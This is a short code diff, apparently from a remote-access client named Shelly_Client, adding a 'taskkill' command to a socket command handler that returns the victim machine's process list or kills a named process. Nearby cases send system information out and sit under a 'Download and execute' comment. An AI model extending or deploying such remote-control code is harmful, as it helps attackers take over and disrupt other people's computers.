@@ -66,6 +66,21 @@ namespace Shelly_Client
                     SocketHandler.Send(Functions.General.GetSystemInfo());
                     break;
 
+                // Terminate process
+                case "taskkill":
+
+                    // Check if user wants process list or not
+                    if (Command.Length == 1)
+                    {
+                        // Send list of running processes
+                        SocketHandler.Send(Functions.General.GetRunningProcesses());
+                    } else
+                    {
+                        // Terminate process
+                        Functions.General.TerminateProcess(Command[1]);
+                    }
+                    break;
+
                 // Download and execute
                 case "changewallpaper":
 
